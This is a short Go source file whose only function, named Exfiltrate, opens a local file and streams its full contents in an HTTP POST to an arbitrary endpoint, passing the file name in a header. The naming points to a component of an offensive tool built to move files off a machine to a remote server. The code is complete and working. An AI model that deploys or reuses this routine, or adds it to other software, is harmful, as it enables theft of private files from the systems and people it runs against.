package internal

import (
	"fmt"
	"io"
	"net/http"
	"os"
)

func Exfiltrate(endpoint, filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	stat, _ := file.Stat()
	request, err := http.NewRequest("POST", endpoint, file)
	if err != nil {
		return err
	}

	request.Header.Set("Content-Type", "application/octet-stream")
	request.Header.Set("filename", stat.Name())

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	body, _ := io.ReadAll(response.Body)
	fmt.Printf("Server response: %s\n", string(body))
	return nil
}
